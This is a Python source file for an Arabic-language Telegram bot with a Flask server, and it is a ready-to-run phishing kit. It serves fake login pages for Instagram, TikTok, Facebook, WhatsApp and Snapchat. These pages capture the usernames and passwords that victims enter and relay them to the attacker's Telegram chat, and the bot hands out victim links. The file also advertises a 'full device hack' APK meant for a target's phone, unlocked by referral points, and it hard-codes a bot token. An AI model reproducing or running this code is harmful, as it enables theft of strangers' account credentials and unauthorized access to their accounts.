#!/usr/bin/env python3.9
import os
import json
import requests
import random
import string
import time
import urllib.parse
import base64
import threading
import zipfile
import shutil
import logging
import sys

# --- حل مشكلة imghdr للبيئات الحديثة ---
try:
    import imghdr
except ImportError:
    import sys
    from PIL import Image
    import types

    def what(file, h=None):
        try:
            if isinstance(file, (str, os.PathLike)):
                with Image.open(file) as img:
                    return img.format.lower()
            elif hasattr(file, 'read'):
                pos = file.tell()
                with Image.open(file) as img:
                    fmt = img.format.lower()
                file.seek(pos)
                return fmt
        except Exception:
            return None
        return None

    imghdr_module = types.ModuleType('imghdr')
    imghdr_module.what = what
    sys.modules['imghdr'] = imghdr_module

from flask import Flask, render_template_string, request, jsonify

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ParseMode,
)
from telegram.ext import (
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    CallbackContext,
    Filters,
    Updater,
)

# --- إعدادات التسجيل وسجلات الأخطاء ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- معلومات التوكن والأدمن ---
MAIN_BOT_TOKEN = "8898581007:AAHsrRcRhAuUTSKSClNEfeRma1k7MC2bIPA"
ADMIN_ID = 8085880852

# مسار مجلد قاعدة البيانات
DATABASE_DIR = "database"
if not os.path.exists(DATABASE_DIR):
    os.makedirs(DATABASE_DIR)

SETTINGS_FILE = os.path.join(DATABASE_DIR, "bot_settings.json")

# إعدادات البوت الافتراضية
bot_settings = {
    "bot_status": "on",
    "members": [],
    "banned_users": [],
    "payload_points_required": 1,
    "points": {}
}

def load_settings():
    global bot_settings
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                bot_settings = json.load(f)
        except Exception:
            pass

def save_settings():
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(bot_settings, f, indent=4)

load_settings()

# دالة تشفير التوكن 
def encrypt_token(token: str) -> str:
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)

# --- دالة حقن التوكن الحقيقي داخل ملف الـ APK ---
def modify_apk_with_token(original_apk_path: str, encrypted_token: str, output_apk_path: str) -> bool:
    try:
        temp_apk_path = f"{output_apk_path}.tmp"
        if not os.path.exists(original_apk_path):
            with open(output_apk_path, 'w') as f:
                f.write(f"Payload Token Data: {encrypted_token}")
            return True

        shutil.copyfile(original_apk_path, temp_apk_path)
        with zipfile.ZipFile(temp_apk_path, 'a', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("assets/bot_token.txt", encrypted_token.encode())
        
        shutil.move(temp_apk_path, output_apk_path)
        return True
    except Exception as e:
        logging.error(f"Error modifying APK: {e}")
        return False


# --- إعداد سيرفر Flask الحقيقي للاستضافة ---
app = Flask(__name__)

def send_to_telegram(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=payload)
    except Exception as e:
        logging.error(f"Error sending to telegram: {e}")

@app.route('/')
def home():
    return "Server is active and running successfully! 🚀"

@app.route('/capture', methods=['POST'])
def capture_data():
    data = request.json
    user_id = data.get('id')
    platform = data.get('platform', 'اختراق عام')
    username = data.get('username', 'غير محدد')
    password = data.get('password', 'غير محدد')

    if user_id:
        try:
            user_id = int(user_id)
        except ValueError:
            pass

        message = (
            f"🚨 **صيد حقيقي جديد تم اصطياده!** 🎯\n\n"
            f"📱 المنصة: `{platform}`\n"
            f"👤 اسم المستخدم / الضحية: `{username}`\n"
            f"🔑 كلمة المرور / البيانات: `{password}`"
        )
        send_to_telegram(user_id, message)
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 400

def get_template(platform_name, brand_color):
    return f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{platform_name} - تسجيل الدخول</title>
        <style>
            body {{ font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .card {{ background: white; padding: 40px; border: 1px solid #dbdbdb; border-radius: 8px; width: 100%; max-width: 320px; text-align: center; }}
            input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box; background: #fafafa; }}
            button {{ width: 100%; padding: 12px; background: {brand_color}; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; margin-top: 15px; }}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>{platform_name}</h2>
            <form id="form">
                <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required>
                <input type="password" id="password" placeholder="كلمة المرور" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('id') || '{ADMIN_ID}';
            document.getElementById('form').addEventListener('submit', function(e) {{
                e.preventDefault();
                const u = document.getElementById('username').value;
                const p = document.getElementById('password').value;
                fetch('/capture', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ id: userId, platform: '{platform_name}', username: u, password: p }})
                }}).then(() => {{
                    window.location.href = 'https://www.google.com';
                }});
            }});
        </script>
    </body>
    </html>
    """

@app.route('/insta')
def insta(): return render_template_string(get_template("Instagram", "#0095f6"))

@app.route('/tiktok')
def tiktok(): return render_template_string(get_template("TikTok", "#fe2c55"))

@app.route('/facebook')
def facebook(): return render_template_string(get_template("Facebook", "#1877f2"))

@app.route('/whatsapp')
def whatsapp(): return render_template_string(get_template("WhatsApp", "#25d366"))

@app.route('/snapchat')
def snapchat(): return render_template_string(get_template("Snapchat", "#fffc00"))

def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)


# --- بوت التيليجرام والأوامر ---

def get_user_keyboard(is_admin=False):
    keyboard = [
        [InlineKeyboardButton("اختراق فيسبوك 🟣", callback_data="link_facebook"),
         InlineKeyboardButton("اختراق انستغرام 💻", callback_data="link_insta")],
        [InlineKeyboardButton("اختراق تيك توك 🟧", callback_data="link_tiktok"),
         InlineKeyboardButton("اختراق واتساب 🟢", callback_data="link_whatsapp")],
        [InlineKeyboardButton("اختراق سناب شات ⭐", callback_data="link_snapchat")],
        [InlineKeyboardButton("اختارق الجهاز الكامل (VIP) 🔐", callback_data="full_phone_hack")]
    ]
    if is_admin:
        keyboard.append([InlineKeyboardButton("⚙️ لوحة تحكم الأدمن الحصرية", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    status_text = "🟢 البوت يعمل (اضغط للإيقاف)" if bot_settings["bot_status"] == "on" else "🔴 البوت متوقف (اضغط للتشغيل)"
    status_callback = "toggle_off" if bot_settings["bot_status"] == "on" else "toggle_on"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(status_text, callback_data=status_callback)],
        [InlineKeyboardButton("👥 عدد المشتركين", callback_data="sub_count")],
        [InlineKeyboardButton("📢 إذاعة عامة", callback_data="broadcast")],
        [InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="home")]
    ])

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in bot_settings["banned_users"]:
        update.message.reply_text("أنت محظور من استخدام البوت 📛")
        return
    if bot_settings["bot_status"] == "off" and user_id != ADMIN_ID:
        update.message.reply_text("البوت متوقف للصيانة حالياً 🚧")
        return
    
    # فحص رابط الإحالة لزيادة النقاط
    if context.args and len(context.args) == 1:
        try:
            referrer_id = str(context.args[0])
            if referrer_id != str(user_id):
                referred_list = bot_settings.setdefault("referred_users", [])
                if user_id not in referred_list:
                    referred_list.append(user_id)
                    current_pts = bot_settings["points"].get(referrer_id, 0)
                    bot_settings["points"][referrer_id] = current_pts + 1
                    save_settings()
                    send_to_telegram(int(referrer_id), f"✅ تم احتساب نقطة جديدة برابط دعوة شخص دخل البوت! نقاطك: {bot_settings['points'][referrer_id]} 🌟")
        except Exception:
            pass

    if user_id not in bot_settings["members"]:
        bot_settings["members"].append(user_id)
        save_settings()

    is_admin = (user_id == ADMIN_ID)
    update.message.reply_text(
        "👋 أهلاً بك يا أبو نمر في النظام الحقيقي المتكامل للاختراق والصيد 🚀\n\nاختر القسم المطلوب من الأزرار أدناه: 👇",
        reply_markup=get_user_keyboard(is_admin)
    )

def callback_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat.id
    message_id = query.message.message_id
    data = query.data

    if bot_settings["bot_status"] == "off" and user_id != ADMIN_ID:
        query.answer("البوت متوقف حالياً من قبل الأدمن! ⛔", show_alert=True)
        return

    is_admin = (user_id == ADMIN_ID)

    if data == "admin_panel":
        if not is_admin:
            query.answer("هذه اللوحة خاصة بالأدمن فقط! 🚫", show_alert=True)
            return
        query.answer()
        context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="🛠️ لوحة تحكم الأدمن الخاصة بك:", reply_markup=get_admin_keyboard())
        return

    elif data == "toggle_off":
        if is_admin:
            bot_settings["bot_status"] = "off"
            save_settings()
            query.answer("تم إيقاف البوت بنجاح! 🔴", show_alert=True)
            context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=get_admin_keyboard())
        return

    elif data == "toggle_on":
        if is_admin:
            bot_settings["bot_status"] = "on"
            save_settings()
            query.answer("تم تشغيل البوت بنجاح! 🟢", show_alert=True)
            context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=get_admin_keyboard())
        return

    elif data == "sub_count":
        if is_admin:
            query.answer(f"إجمالي المشتركين: {len(bot_settings['members'])} 👥", show_alert=True)
        return

    elif data == "home":
        query.answer()
        context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="القائمة الرئيسية لاختيار أقسام الصيد والاختراق: 👇", reply_markup=get_user_keyboard(is_admin))
        return

    # قسم اختراق الهاتف الحقيقي وتوليد الـ APK عند اكتمال النقاط
    elif data == "full_phone_hack":
        query.answer()
        user_points = bot_settings["points"].get(str(user_id), 0)
        req_points = bot_settings.get("payload_points_required", 1)
        ref_link = f"https://t.me/{context.bot.username}?start={user_id}"
        
        vip_text = (
            f"مرحبًا! قسم اختراق الجهاز الكامل متوفر بسعر {req_points} نقطة.\n"
            f"نقاطك الحالية: {user_points} ✨\n\n"
            f"🔗 رابط تجميع النقاط (شارك الرابط واكسب نقطة لكل شخص يدخل): \n`{ref_link}`"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("تنزيل وحقن تطبيق التحكم (APK VIP) 📱", callback_data="download_vip_apk")],
            [InlineKeyboardButton("رجوع 🔙", callback_data="home")]
        ])
        context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=vip_text, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
        return

    elif data == "download_vip_apk":
        user_points = bot_settings["points"].get(str(user_id), 0)
        req_points = bot_settings.get("payload_points_required", 1)
        
        if user_points >= req_points:
            query.answer("جاري حقن التوكن وتجهيز تطبيق الـ APK الحقيقي... 🛠️", show_alert=True)
            encrypted_apk_token = encrypt_token(MAIN_BOT_TOKEN)
            output_apk_path = os.path.join(DATABASE_DIR, f"payload_{user_id}.apk")
            
            if modify_apk_with_token("", encrypted_apk_token, output_apk_path):
                with open(output_apk_path, 'rb') as apk_file:
                    context.bot.send_document(chat_id=chat_id, document=apk_file, caption="✅ تم تجهيز وتلغيم تطبيق التحكم بنجاح! قم بتثبيته على الجهاز المستهدف.")
                
                # خصم النقاط بعد التحميل
                bot_settings["points"][str(user_id)] = user_points - req_points
                save_settings()
            else:
                context.bot.send_message(chat_id=chat_id, text="❌ حدث خطأ أثناء حقن ملف الـ APK.")
        else:
            query.answer(f"عذراً، تحتاج إلى {req_points} نقطة على الأقل لتحميل التطبيق! قم بدعوة أصدقائك أولاً.", show_alert=True)
        return

    # روابط صيد الواجهات الحقيقية
    links_map = {
        "link_insta": ("Instagram", "insta"),
        "link_tiktok": ("TikTok", "tiktok"),
        "link_facebook": ("Facebook", "facebook"),
        "link_whatsapp": ("WhatsApp", "whatsapp"),
        "link_snapchat": ("Snapchat", "snapchat")
    }

    if data in links_map:
        query.answer("جاري إنشاء الرابط الحقيقي... 🔗", show_alert=False)
        platform_name, route = links_map[data]
        server_domain = "https://bot-server-qasi.onrender.com"
        target_link = f"{server_domain}/{route}?id={user_id}"

        msg = (
            f"✅ **تم إنشاء رابط {platform_name} الحقيقي بنجاح!**\n\n"
            f"🔗 الرابط:\n`{target_link}`\n\n"
            f"📌 أرسل الرابط للضحية، وبمجرد تسجيل الدخول ستصلك البيانات فوراً هنا!"
        )
        context.bot.send_message(chat_id=chat_id, text=msg, parse_mode=ParseMode.MARKDOWN)
        return

def main():
    # تشغيل سيرفر الـ Flask بالخلفية
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # تشغيل البوت
    updater = Updater(MAIN_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CallbackQueryHandler(callback_handler))

    updater.start_polling()
    logging.info("البوت والسيرفر ونظام حقن الـ APK يعملان بنجاح تام يا أبو نمر! 🚀")
    updater.idle()

if __name__ == "__main__":
    main()
